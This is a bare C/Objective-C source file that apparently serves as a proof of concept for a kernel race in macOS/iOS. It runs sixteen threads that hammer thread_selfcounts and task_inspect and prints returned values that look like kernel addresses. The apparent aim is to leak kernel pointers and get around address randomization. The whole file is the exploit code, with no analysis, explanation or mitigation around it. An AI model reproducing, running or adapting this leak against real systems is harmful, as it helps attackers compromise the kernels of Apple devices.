#import <Foundation/Foundation.h>

extern int thread_selfcounts(int type, user_addr_t buf, user_size_t nbytes);

#define THREAD_COUNT 0x10
volatile bool stop = false;

void race(){
    int err = 0;
    uint64 retu[2] = {0, 0};
    uint64* info_out = malloc(4 * 4);
    memset(info_out, 0x0 , 16);
    int size = 4;
    while(!stop){
        err = thread_selfcounts(1, &retu, sizeof(retu));
        task_inspect(mach_task_self(), 1, info_out, &size);
        if((info_out[0] & 0xffffff0000000000) != 0){
            printf("%16llx\n", info_out[0]);
            printf("%16llx\n", info_out[1]);
        }
    }
}

int main(int argc, const char * argv[]) {
    int err = 0;
    pthread_t thread[THREAD_COUNT] = {0};
    for(int z = 0; z < THREAD_COUNT; z++){
        pthread_create(&thread[z], NULL, race, NULL);
        
    }
    
    uint64 info_out[2] = {0};
    int size = 4;
    uint64 retu[2] = {0, 0};
    
    while(1){
        err = thread_selfcounts(1, &retu, sizeof(retu));
    }
    return 0;
}
